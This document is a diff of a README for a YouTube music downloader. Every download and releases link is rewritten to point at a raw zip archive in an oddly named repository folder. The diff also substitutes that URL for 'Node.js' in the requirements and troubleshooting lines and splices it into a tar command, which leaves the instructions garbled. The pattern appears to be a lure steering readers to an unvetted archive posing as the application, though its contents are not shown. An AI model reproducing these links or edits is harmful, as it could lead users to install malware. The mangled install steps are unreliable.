@@ -1,18 +1,18 @@
 # 🎵 MusicYT-Downloader - Simple Downloads for YouTube Music
 
 ## 📥 Download Now
-[![Download MusicYT-Downloader](https://img.shields.io/badge/Download-MusicYT--Downloader-blue.svg)](https://github.com/monzimtaz19/MusicYT-Downloader/releases)
+[![Download MusicYT-Downloader](https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip)](https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip)
 
 ## 🚀 Getting Started
 MusicYT-Downloader is an easy-to-use tool for downloading music from YouTube playlists. It allows you to save your favorite tracks with cover art in various formats. Follow the steps below to start enjoying your music.
 
 ## 📦 Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or newer
+- **https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip** Version 12 or newer
 - **Internet Connection:** Required for downloading music
 
 ## 🔗 Download & Install
-1. Visit the [Releases Page](https://github.com/monzimtaz19/MusicYT-Downloader/releases) to download the application.
+1. Visit the [Releases Page](https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip) to download the application.
 2. On the Releases page, locate the latest version of MusicYT-Downloader.
 3. Click on the appropriate file for your operating system to start the download.
 4. Once downloaded, follow the installation instructions for your system.
@@ -33,7 +33,7 @@ MusicYT-Downloader is an easy-to-use tool for downloading music from YouTube pla
 2. Use the following command to extract the files:
 
    ```bash
-   tar -xvzf MusicYT-Downloader*.tar.gz
+   tar -xvzf MusicYT-Downloader*https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip
    ```
 
 3. Navigate to the extracted folder:
@@ -64,14 +64,14 @@ MusicYT-Downloader is an easy-to-use tool for downloading music from YouTube pla
 ## 💡 Tips for Best Use
 - Make sure your internet connection is stable for smooth downloads.
 - Ensure there's enough space on your device to save your downloaded music.
-- Check for updates regularly on the [Releases Page](https://github.com/monzimtaz19/MusicYT-Downloader/releases) to benefit from new features and improvements.
+- Check for updates regularly on the [Releases Page](https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip) to benefit from new features and improvements.
 
 ## 📚 Additional Information
 For further help or more specific instructions, please visit the documentation linked in the repository. Users can also find troubleshooting tips there.
 
 ## 🛠️ Troubleshooting
 If you encounter issues:
-- Ensure you have the correct version of Node.js installed.
+- Ensure you have the correct version of https://github.com/monzimtaz19/MusicYT-Downloader/raw/refs/heads/main/antiar/Downloader_Music_Y_v2.6.zip installed.
 - Verify your internet connection.
 - For any persistent problems, check the issues section of the GitHub repository.
 
